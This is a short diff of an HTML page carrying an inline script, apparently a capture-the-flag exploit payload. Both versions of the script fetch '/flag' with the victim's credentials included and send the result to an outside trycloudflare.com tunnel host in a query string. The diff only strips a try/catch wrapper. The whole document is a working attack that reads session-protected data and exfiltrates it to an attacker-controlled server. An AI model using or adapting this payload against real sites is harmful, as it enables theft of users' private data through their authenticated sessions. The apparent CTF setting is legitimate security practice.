@@ -3,17 +3,14 @@
     <body>
         <script>
             (async () => {
-                try {
-                    const res = await fetch("/flag", {
-                        credentials: "include",
-                    });
-                    const flag = await res.text();
-
-                    await fetch(
-                        "https://brother-recent-sorts-thereby.trycloudflare.com/?flag=" +
-                            encodeURIComponent(flag)
-                    );
-                } catch (err) {}
+                const res = await fetch("/flag", {
+                    credentials: "include",
+                });
+                const flag = await res.text();
+                await fetch(
+                    "https://brother-recent-sorts-thereby.trycloudflare.com/?flag=" +
+                        encodeURIComponent(flag)
+                );
             })();
         </script>
     </body>
